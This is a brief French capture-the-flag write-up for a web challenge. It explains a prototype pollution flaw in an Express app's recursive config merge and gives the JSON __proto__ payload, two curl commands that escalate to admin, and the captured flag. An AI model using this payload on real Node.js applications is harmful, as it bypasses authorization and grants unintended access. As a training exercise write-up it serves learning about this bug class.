# kande (prototype pollution)

- Catégorie : web
- Résolu : sam. 07 nov.
- Instance : https://fyzkpvcdsryy67ue.t.ctf.tg

## Énoncé
Express. POST /api/config fusionne votre JSON dans la config (merge récursif). /admin accessible seulement si admin==true.

## Attaque
Prototype pollution : le merge ne filtre pas __proto__.
POST /api/config  {"__proto__":{"admin":true}}  -> Object.prototype.admin = true.
GET /admin -> le check config.admin hérite de true -> flag.

## Exploit
```bash
curl -X POST -H 'Content-Type: application/json' -d '{"__proto__":{"admin":true}}' <B>/api/config
curl <B>/admin
```

## Flag
`NCTF{89e232e30d8a55e5fe8ba10b}`
